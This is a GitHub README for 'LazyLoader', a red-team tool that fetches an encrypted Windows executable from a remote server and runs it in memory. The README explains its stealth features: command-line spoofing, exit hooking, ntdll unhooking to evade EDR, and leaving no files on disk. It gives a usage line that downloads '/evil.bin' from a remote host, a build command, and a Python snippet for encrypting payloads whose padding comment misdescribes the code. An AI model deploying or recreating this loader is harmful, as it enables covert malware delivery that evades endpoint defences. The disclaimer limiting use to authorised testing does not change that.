# 🦎 LazyLoader — Stealthy Reflective PE Loader for Windows ᘛ⁐̤ᕐᐷ

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/f4cc6e4e-65fc-44f9-b2f8-3228e3876d06" />


Disclaimer: This tool is intended for educational purposes and authorized red team operations only. Do not use on systems you do not own or have explicit permission to test. 

## 🧩 Overview
LazyLoader is a sophisticated, in-memory Windows PE (Portable Executable) loader that:

- Downloads an AES-256 encrypted PE file and its decryption key from a remote HTTP server.
- Decrypts the payload in memory using Windows CryptoAPI.
- Reflectively maps and relocates the PE into the current process.
- Repairs the Import Address Table (IAT) with optional API hooking to spoof command-line arguments and prevent process exit.
- Executes the payload in a new thread.
- Optionally unhooks ntdll.dll by restoring its .text section from a clean process (e.g., notepad.exe) to evade EDR/userland hooks.
- Designed for stealth, LazyLoader leaves no trace on disk and hides its execution context from command-line inspection tools.

## ⚙️ Features
- ✅ Remote Payload Fetching
Uses WinHTTP to securely download encrypted PE and key files from a remote server.

## ✅ AES-256 Decryption
- Leverages Windows CryptAcquireContext, CryptCreateHash, and CryptDecrypt for secure in-memory decryption.

## ✅ Reflective PE Loading

- Parses PE headers and sections.
- Allocates memory at preferred or relocated base.
- Copies headers and sections.
- Repairs IAT with dynamic GetProcAddress.

## ✅ Command-Line Masquerading
Spoofs:

- GetCommandLineA/W
- __p___argv
- __p___wargv
- __p___argc
- __getmainargs
- __wgetmainargs

Prevents detection via process argument inspection.

- ✅ **Exit Function Hooking**
Hooks exit, _exit, ExitProcess, etc., to redirect termination to ExitThread(0) — keeping the host process alive.

- ✅ **EDR Evasion via NTDLL Unhooking**
Optionally spawns a suspended notepad.exe, reads clean ntdll.dll from its memory, and restores hooked .text sections in the current process.

- ✅ **No Disk Artifacts**
Everything runs in memory — no temporary files written.

## 🚀 Usage
```cmd
LazyLoader.exe <Host> <Port> <EncryptedPEPath> <KeyPath>
```
### Example
```cmd
LazyLoader.exe 192.168.1.100 8080 /evil.bin /key.bin
```
### This will:

- Connect to http://192.168.1.100:8080/evil.bin and download the encrypted payload.
- Download the key from http://192.168.1.100:8080/key.bin.
- Decrypt the payload using AES-256.
- Spoof command-line to appear as "whatEver".
- Load and execute the PE reflectively.

## 🔐 Encryption Requirements
The payload must be encrypted with AES-256 in ECB mode (or compatible with Windows CryptDecrypt defaults).

Example Python encryption snippet:

```python
from Crypto.Cipher import AES
import hashlib

key = b"your-32-byte-key-here-------------"  # Must be 32 bytes
data = open("payload.bin", "rb").read()
cipher = AES.new(key, AES.MODE_ECB)
encrypted = cipher.encrypt(data.ljust((len(data) // 16 + 1) * 16, b'\x00'))  # PKCS#7-style padding

with open("evil.bin", "wb") as f:
    f.write(encrypted)
```
🔍 Note: LazyLoader uses SHA-256 to hash the key file contents before deriving the AES key — ensure your encryption matches this behavior. 

## 🧪 Compilation
Requirements
x86_64-w64-mingw32-gcc
Libraries: WinHttp, Crypt32, Psapi
Build with x86_64-w64-mingw32-gcc
cmd

x86_64-w64-mingw32-gcc -o loader.exe main.c -lwinhttp -lcrypt32 -lpsapi 

## 🛡️ Detection Evasion Techniques

### LoadLibrary
— avoids module enumeration.
IAT Repair + Hooking
Spoofs command-line and argv to hide true intent.
Exit Hooking
Redirects
ExitProcess
to
ExitThread
— host process stays alive.
NTDLL Unhooking
Restores clean
.text
from external process — defeats userland hooks.
No Disk Writes
Entire execution is memory-resident.

## 📜 License GPLv3
Educational & Red Team Use Only. Not for malicious exploitation.

## 📬 Contact / Contribution
For bugs, suggestions, or contributions — open an issue or submit a PR.

Author: grisun0 - LazyOwn RedTeam
Version: release/v0.0.1
Year: 2025 

## ⚠️ Legal Notice
This software is for authorized penetration testing and research purposes only. Misuse of this tool can result in criminal prosecution. The author(s) assume no liability and are not responsible for any misuse or damage caused by this program.

✅ Stay LazyOwn. Stay Stealthy.

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
